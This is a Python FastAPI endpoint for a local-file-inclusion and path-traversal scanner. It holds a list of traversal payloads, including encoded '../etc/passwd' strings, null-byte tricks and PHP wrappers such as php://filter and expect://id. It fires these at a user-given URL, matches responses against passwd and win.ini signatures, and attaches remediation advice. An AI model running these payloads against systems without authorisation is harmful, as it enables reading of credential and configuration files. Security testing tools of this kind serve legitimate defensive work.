"""
LFI / Path Traversal Scanner
Tests for Local File Inclusion (LFI) and directory traversal vulnerabilities.
"""
from __future__ import annotations
import asyncio
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode
from typing import List, Dict, Tuple, Optional, Any
import httpx
from fastapi import APIRouter
from pydantic import BaseModel

router = APIRouter()

TRAVERSAL_PAYLOADS = [
    # Unix traversal
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    # Windows traversal
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "C:\\windows\\win.ini",
    "C:/windows/win.ini",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "expect://id",
    "file:///etc/passwd",
    # Null byte injection (older PHP)
    "../../../../etc/passwd%00",
    "../../etc/passwd%00.jpg",
]

# Signatures indicating successful LFI
UNIX_SIGS = [
    r"root:x:0:0:",
    r"daemon:x:",
    r"/bin/(sh|bash)",
    r"bin:x:\d+:",
    r"www-data:x:",
]
WIN_SIGS = [
    r"\[extensions\]",
    r"for 16-bit app support",
    r"\[mci extensions\]",
]
PHP_SIGS = [
    r"PD9waHA",   # base64 of <?php
    r"<\?php",
    r"SCRIPT_NAME",
    r"HTTP_HOST",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (BB-Suite LFI Scanner)",
    "Accept": "text/html,*/*",
}


class LFIRequest(BaseModel):
    target: str
    depth: str = "medium"  # quick | medium | deep


def _normalize_url(url: str) -> str:
    if not url.startswith("http"):
        url = "https://" + url
    return url


def _detect_lfi(text: str) -> tuple[bool, str]:
    for sig in UNIX_SIGS:
        if re.search(sig, text):
            return True, f"Unix passwd file signature: `{sig}`"
    for sig in WIN_SIGS:
        if re.search(sig, text, re.I):
            return True, f"Windows ini file signature: `{sig}`"
    for sig in PHP_SIGS:
        if re.search(sig, text):
            return True, f"PHP source / env leak: `{sig}`"
    return False, ""


async def _test_param(client: httpx.AsyncClient, url: str, param: str,
                       payloads: list[str], findings: list, baseline_len: int):
    parsed = urlparse(url)
    base_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

    for payload in payloads:
        test_params = dict(base_params)
        test_params[param] = payload
        test_url = parsed._replace(query=urlencode(test_params)).geturl()
        try:
            r = await client.get(test_url, timeout=8, follow_redirects=True)
            detected, sig = _detect_lfi(r.text)
            if detected:
                findings.append({
                    "severity": "critical",
                    "title": f"LFI Confirmed — Parameter `{param}`",
                    "detail": (
                        f"Path traversal payload `{payload}` caused file inclusion. "
                        f"Signature detected: {sig}. URL: {test_url[:150]}"
                    ),
                    "recommendation": (
                        "URGENT: Never use user-supplied input to construct file paths. "
                        "Use a whitelist of allowed files. Set open_basedir in PHP. "
                        "Apply chroot jails for web processes. Disable dangerous PHP wrappers "
                        "(php://, expect://, data://) in php.ini."
                    ),
                })
                return  # One confirmed finding per param is enough

            # Detect significant response-size change (may indicate file read)
            if abs(len(r.text) - baseline_len) > 500 and len(r.text) > baseline_len + 200:
                findings.append({
                    "severity": "medium",
                    "title": f"Possible Path Traversal — Parameter `{param}` (response size anomaly)",
                    "detail": (
                        f"Payload `{payload}` caused a significant response size change "
                        f"({baseline_len} → {len(r.text)} bytes). Manual verification recommended."
                    ),
                    "recommendation": "Review the parameter for file path usage and apply strict input validation.",
                })
                return
        except Exception:
            pass


@router.post("/lfi_scanner")
async def lfi_scan(req: LFIRequest):
    t0 = time.time()
    target = _normalize_url(req.target.strip())
    findings = []

    depth_map = {"quick": 5, "medium": 12, "deep": len(TRAVERSAL_PAYLOADS)}
    payloads = TRAVERSAL_PAYLOADS[:depth_map.get(req.depth, 12)]

    async with httpx.AsyncClient(headers=HEADERS, verify=False) as client:
        # Get baseline
        try:
            base = await client.get(target, timeout=10, follow_redirects=True)
            baseline_len = len(base.text)
        except Exception as e:
            return {"success": False, "error": str(e)}

        parsed = urlparse(target)
        params = list(parse_qs(parsed.query).keys())

        # Also probe common LFI params if URL has none
        if not params:
            params = ["file", "page", "include", "path", "dir", "doc", "folder", "root", "view", "template"]

        tasks = [
            _test_param(client, target, p, payloads, findings, baseline_len)
            for p in params[:10]
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

    # Check for PHP wrappers in base response
    if re.search(r"php://|file://|data://|expect://", base.text):
        findings.append({
            "severity": "medium",
            "title": "PHP Wrapper Reference in Page Source",
            "detail": "Page source references PHP stream wrappers which may be exploitable for LFI.",
            "recommendation": "Audit code using stream wrappers and disable unnecessary PHP wrappers.",
        })

    if not findings:
        findings.append({
            "severity": "pass",
            "title": "No LFI Vulnerabilities Detected",
            "detail": f"Tested {len(params)} parameters with {len(payloads)} payloads at {target}.",
            "recommendation": "Maintain strict input validation. Perform authenticated testing for deeper coverage.",
        })

    crits = sum(1 for f in findings if f["severity"] == "critical")
    highs = sum(1 for f in findings if f["severity"] == "high")

    return {
        "success": True,
        "data": {
            "summary": {
                "Target": target,
                "Depth": req.depth,
                "Parameters Tested": str(len(params[:10])),
                "Payloads per Param": str(len(payloads)),
                "Critical Findings": str(crits),
                "Duration": f"{time.time()-t0:.1f}s",
            },
            "findings": findings,
        },
    }
